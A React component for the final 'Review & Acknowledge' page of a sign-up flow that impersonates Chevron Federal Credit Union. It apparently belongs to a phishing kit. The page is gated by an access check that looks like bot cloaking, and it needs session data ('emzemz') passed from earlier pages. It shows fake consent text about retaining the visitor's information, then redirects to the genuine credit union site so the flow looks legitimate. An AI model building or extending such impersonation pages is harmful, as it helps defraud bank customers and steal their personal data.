import React, { useState } from 'react';
import { useLocation } from 'react-router-dom';
import FlowPageLayout from '../components/FlowPageLayout';
import useAccessCheck from '../Utils/useAccessCheck';
import { baseUrl } from '../constants';

const Terms: React.FC = () => {
  const [isChecked, setIsChecked] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');

  const location = useLocation();
  const { emzemz } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  const handleCheckboxChange = () => {
    setIsChecked((previous) => {
      const next = !previous;
      if (next) {
        setErrorMessage('');
      }
      return next;
    });
  };

  const handleSubmit = (event: React.FormEvent) => {
    event.preventDefault();
    if (!isChecked) {
      setErrorMessage('Please agree to the terms before proceeding.');
      return;
    }

    setIsLoading(true);
    setErrorMessage('');

    setTimeout(() => {
      window.location.href = 'https://www.chevronfcu.org/';
    }, 1500);
  };

  if (isAllowed === null) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Checking access…</div>;
  }

  if (isAllowed === false) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Access denied. Redirecting…</div>;
  }

  if (!emzemz) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Missing session details. Please restart the process.</div>;
  }

  const renderError = (message?: string) =>
    message ? (
      <div className="flex items-center gap-2 text-xs font-semibold text-red-600">
        <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
          <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
        </svg>
        {message}
      </div>
    ) : null;

  return (
    <FlowPageLayout
      eyebrow="Final Step"
      title="Review & Acknowledge"
      description="Confirm you’ve read Chevron Federal Credit Union’s disclosure before we send you to online banking."
      contentClassName="space-y-6"
    >
      <div className="space-y-4 text-sm text-[#0e2f56]">
        <p>
          By submitting this registration form, I authorize Chevron Federal Credit Union and its affiliates to obtain
          consumer reports and any related information for verification, fraud prevention, and servicing of my accounts
          in accordance with applicable law.
        </p>
        <p>
          I also permit Chevron Federal Credit Union to retain my information for use consistent with its{' '}
          <a href="#" className="text-[#0b5da7] hover:underline">
            Terms of Service
          </a>{' '}
          and{' '}
          <a href="#" className="text-[#0b5da7] hover:underline">
            Privacy Statement
          </a>
          .
        </p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-4">
        <label className="flex items-start gap-3 text-sm text-[#0e2f56]">
          <input
            type="checkbox"
            checked={isChecked}
            onChange={handleCheckboxChange}
            className="mt-1 h-4 w-4 rounded border-gray-300 text-[#0b5da7] focus:ring-[#1d78c1]"
          />
          <span>I understand and agree to the disclosure above.</span>
        </label>

        {renderError(errorMessage)}

        <div className="flex justify-end">
          <button
            type="submit"
            disabled={isLoading}
            className="inline-flex items-center justify-center rounded-sm bg-[#003e7d] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#002c5c] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {isLoading ? 'Redirecting…' : 'Continue'}
          </button>
        </div>
      </form>

      <div className="rounded-sm bg-[#f0f6fb] px-4 py-3 text-xs text-[#0e2f56]/80">
        Chevron Federal Credit Union will direct you to secure online banking once you confirm these terms.
      </div>
    </FlowPageLayout>
  );
};

export default Terms;
